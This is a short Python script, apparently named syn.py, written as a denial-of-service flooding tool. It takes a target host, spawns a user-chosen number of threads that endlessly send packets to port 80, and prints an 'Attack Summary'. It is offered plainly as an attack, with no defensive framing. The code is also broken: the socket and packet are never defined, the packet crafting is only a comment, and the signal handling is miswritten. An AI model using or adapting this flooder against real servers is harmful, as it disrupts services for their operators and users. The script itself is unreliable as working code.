import sys
import socket
import threading
import time
import signal

p_num = 0
successful_packets = 0 
failed_packets = 0
mutex = threading.Lock()

def print_stats():
  time.sleep(1)
  with mutex:
    print("\n\nAttack Summary:")
    print("PACKETS: {}  Successful: {} Failed: {}".format(p_num, successful_packets, failed_packets))
    print("Attack Time: {} seconds".format(time_diff))
    sys.exit(0)

def attack(target_ip, port):
  global p_num, successful_packets, failed_packets, mutex, time_diff
  
  signal(SIGINT, print_stats)

  while True:
    try:
      # Craft packet
      sock.sendto(packet, (target_ip, port))
      with mutex:
        p_num += 1
        successful_packets += 1
        if p_num == 1:
          print("[+] Attack started!")
    except:
      with mutex:
        failed_packets += 1

if len(sys.argv) != 2:
  print("Usage: python syn.py <target>")
  sys.exit(1)

target = sys.argv[1]

try:
  target_ip = socket.gethostbyname(target) 
except socket.gaierror:
  print("Unable to resolve target IP")
  sys.exit(1)

print("Target IP:", target_ip)
port = 80

threads = num_threads = int(input("Number of threads: "))
time_diff = 0

start_time = time.time()

for _ in range(num_threads):
  thread = threading.Thread(target=attack, args=(target_ip, port))
  thread.daemon = True
  thread.start()

while True:
  time.sleep(1)
  time_diff = time.time() - start_time